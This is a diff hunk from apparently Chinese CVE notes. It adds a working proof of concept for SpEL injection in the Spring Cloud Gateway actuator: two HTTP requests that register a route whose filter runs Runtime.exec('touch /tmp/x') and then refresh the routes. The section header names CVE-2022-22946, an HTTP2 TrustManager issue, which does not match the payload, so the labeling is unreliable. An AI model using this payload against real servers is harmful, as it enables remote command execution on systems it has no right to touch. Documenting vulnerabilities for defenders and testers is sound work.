@@ -38,5 +38,80 @@ CVE-2022-22946：HTTP2 不安全的 TrustManager :
 # ::p oc :
 
 
-正在编译中
+POST /actuator/gateway/routes/new_route HTTP/1.1    
 
+Host: 127.0.0.1:9000
+
+Connection: close
+
+Content-Type: application/json
+
+{
+
+ "predicates": [
+
+    {
+
+     "name": "Path",
+
+     "args": {
+
+       "_genkey_0": "/new_route/**"
+
+     }
+
+    }
+
+  ],
+
+ "filters": [
+
+    {
+
+     "name": "RewritePath",
+
+     "args": {
+
+       "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch/tmp/x\")}",
+
+       "_genkey_1": "/${path}"
+
+     }
+
+    }
+
+  ],
+
+ "uri": "https://wya.pl",
+
+ "order": 0
+
+}
+
+POST /actuator/gateway/refresh HTTP/1.1
+
+Host: 127.0.0.1:9000
+
+Content-Type: application/json
+
+Connection: close
+
+Content-Length: 258
+
+{
+
+ "predicate": "Paths: [/new_route], match trailing slash:true",
+
+ "route_id": "new_route",
+
+ "filters": [
+
+   "[[RewritePath#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} =/${path}], order = 1]"
+
+  ],
+
+ "uri": "https://wya.pl",
+
+ "order": 0
+
+}
